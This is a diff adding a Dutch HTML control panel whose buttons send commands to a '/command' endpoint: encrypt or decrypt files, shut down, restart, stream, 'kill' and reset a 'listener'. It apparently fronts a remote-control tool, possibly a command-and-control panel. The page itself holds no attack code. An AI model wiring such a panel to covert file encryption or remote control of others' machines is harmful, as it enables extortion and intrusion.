@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Controle Paneel</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #121212;
+      color: #33ff33;
+      padding: 20px;
+    }
+    button {
+      margin: 5px;
+      padding: 10px;
+      background: #222;
+      color: #33ff33;
+      border: 1px solid #33ff33;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 15px;
+      color: #00ff00;
+    }
+  </style>
+</head>
+<body>
+  <h1>Controle Paneel</h1>
+  <div>
+    <button onclick="sendCommand('encrypt')">Encrypteer Bestanden</button>
+    <button onclick="sendCommand('decrypt')">Decrypteer Bestanden</button>
+    <button onclick="sendCommand('shutdown')">Zet uit</button>
+    <button onclick="sendCommand('restart')">Herstart</button>
+    <button onclick="sendCommand('logout')">Loguit</button>
+    <button onclick="sendCommand('start_presentation')">Start Presentatie</button>
+    <button onclick="sendCommand('start_slideshow')">Start Diavoorstelling</button>
+    <button onclick="sendCommand('stop_slideshow')">Stop Diavoorstelling</button>
+    <button onclick="sendCommand('prev_slide')">Vorige Dia</button>
+    <button onclick="sendCommand('next_slide')">Volgende Dia</button>
+    <button onclick="sendCommand('start_stream')">Start Stream</button>
+    <button onclick="sendCommand('stop_stream')">Stop Stream</button>
+    <button onclick="sendCommand('kill')">Kill</button>
+    <button onclick="sendCommand('restart_listener')">Reset</button>
+  </div>
+
+  <p id="status"></p>
+
+  <script>
+    function sendCommand(cmd) {
+      fetch('/command', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'cmd=' + encodeURIComponent(cmd)
+      })
+      .then(response => response.text())
+      .then(text => {
+        let statusEl = document.getElementById('status');
+        statusEl.textContent = text;
+        statusEl.style.color = 'limegreen'; // succeskleur
+        setTimeout(() => { statusEl.textContent = ''; }, 3000);
+      })
+      .catch(err => {
+        let statusEl = document.getElementById('status');
+        statusEl.textContent = 'Fout bij versturen commando.';
+        statusEl.style.color = 'red'; // foutkleur
+      });
+    }
+  </script>
+</body>
+</html>
